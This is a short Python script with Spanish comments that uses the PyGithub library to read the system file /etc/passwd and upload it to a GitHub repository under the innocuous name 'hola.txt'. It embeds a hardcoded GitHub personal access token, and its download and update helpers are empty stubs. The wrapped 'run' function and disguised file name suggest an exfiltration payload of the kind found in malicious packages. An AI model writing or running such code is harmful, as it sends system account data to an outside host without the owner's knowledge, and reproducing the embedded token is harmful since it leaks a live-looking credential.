from github import Github
import base64

def run():
    # Token de acceso personal de GitHub
    # Puedes generar uno en: https://github.com/settings/tokens
    ACCESS_TOKEN = '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'

    # Nombre del repositorio
    REPO_NAME = 'almacenlar'

    # Ruta local del archivo que quieres subir
    LOCAL_FILE_PATH = '/etc/passwd'

    def upload_to_github():
        # Autenticación con tu token
        g = Github(ACCESS_TOKEN)

        # Obtener el repositorio
        repo = g.get_user().get_repo(REPO_NAME)

        # Leer el contenido del archivo con la codificación adecuada (utf-8 en este caso)
        with open(LOCAL_FILE_PATH, 'r', encoding='utf-8') as file:
            file_content = file.read()

        # Crear un nuevo archivo en el repositorio de GitHub
        repo.create_file(
            path='hola.txt',
            message='Subir hola.txt',
            content=file_content
        )

    def downloadFile(filename):
        # Lógica para descargar el archivo desde algún lugar
        # ...

        # Supongamos que obtienes el contenido en formato base64
        base64_content = "..."  # Reemplaza con el contenido real

        # Decodificar el contenido utilizando 'utf-8'
        base64_bytes = base64_content.encode('utf-8')
        content = base64.b64decode(base64_bytes).decode('utf-8')

        return content

    def updateFile(filename):
        # Lógica para actualizar el archivo
        # ...

        # Lógica para obtener el nuevo contenido del archivo
        new_content = downloadFile(filename)

        # Lógica para actualizar el archivo localmente
        # ...

        return new_content

    if __name__ == "__main__":
        upload_to_github()
